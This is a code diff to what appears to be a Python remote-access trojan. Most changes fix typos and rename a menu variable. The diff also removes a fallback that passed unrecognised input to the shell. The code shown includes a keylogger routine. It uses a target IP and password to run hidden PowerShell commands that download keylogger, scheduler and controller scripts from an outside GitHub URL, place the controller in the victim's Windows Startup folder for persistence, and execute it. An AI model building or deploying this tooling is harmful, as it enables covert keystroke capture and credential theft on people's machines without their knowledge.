@@ -67,8 +67,8 @@ def read_config(config_file):
     # get target configurations
     configuration["IP ADDRESS"] = read_lines[0].strip()
     configuration["PASSWORD"] = read_lines[1].strip()
-    configuration["WORIKING DIRECTORY"] = (read_lines[2].replace("\\", "/")).strip()
-    configuration["STARTUP DIRECTORY"] = (read_lines[3].replace("\\", "/")).strip()
+    configuration["WORKING DIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
+    configuration["STARTUP DIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
     
     return configuration
 
@@ -159,13 +159,13 @@ def remote_command(address, password, command):
 # keylogger
 def keylogger(address, password, target_username, working_directory):
     
-    print("[+] Satrting Keylogger")
+    print("[+] Starting Keylogger")
     # set commands-web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/keylogger.ps1 -OutFile {working_directory}/keylogger.ps1\""
     schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/schedule.ps1 -OutFile {working_directory}/schedule.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile controller.cmd"
+    controller_command = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile controller.cmd"
     print("[+] Keylogger Ready")
-    execute_keylogger = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden ./controller.cmd"
+    execute_keylogger = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden ./controller.cmd"
     
     # execute command
     print("[*] Installing Keylogger")
@@ -202,7 +202,7 @@ def cli(arguments):
     if arguments:
         print(options_menu)
 
-        config_file = input(f"{header}")
+        option = input(f"{header}")
 
         try:
             configuration = read_config(sys.argv[1])
@@ -219,46 +219,42 @@ def cli(arguments):
         target_username = working_directory[9:-19]
 
         # enter option
-        if config_file == "":
+        if option == "":
             main()
         
         # remote console
-        if config_file == "0":
+        if option == "0":
             connect(ipv4, password)
             
         #keylogger
-        elif config_file == "1":
+        elif option == "1":
             keylogger(ipv4, password, target_username, working_directory)
             
         # help me
-        elif config_file == "h" or config_file == "help":
+        elif option == "h" or option == "help":
             main()
 
         # clear UI
-        elif config_file == "h" or config_file == "help":
+        elif option == "h" or option == "help":
             clear()
             
         # get version number
-        elif config_file == "v" or config_file == "version":
+        elif option == "v" or option == "version":
             os.system(f"cat {local_path}/version.txt")
             
         # update option
-        elif config_file == "u" or config_file == "update":
+        elif option == "u" or option == "update":
             update()
             exit()
             
         # remove installation
-        elif config_file == "r" or config_file == "remove" or config_file == "uninstall":
+        elif option == "r" or option == "remove" or option == "uninstall":
             remove()
             
         # quit option
-        elif config_file == "q" or config_file == "quit" or config_file == "exit":
+        elif option == "q" or option == "quit" or option == "exit":
             exit()
         
-        # exception
-        else:
-            os.system(config_file)
-            
         # print new line
         print("\n")
 
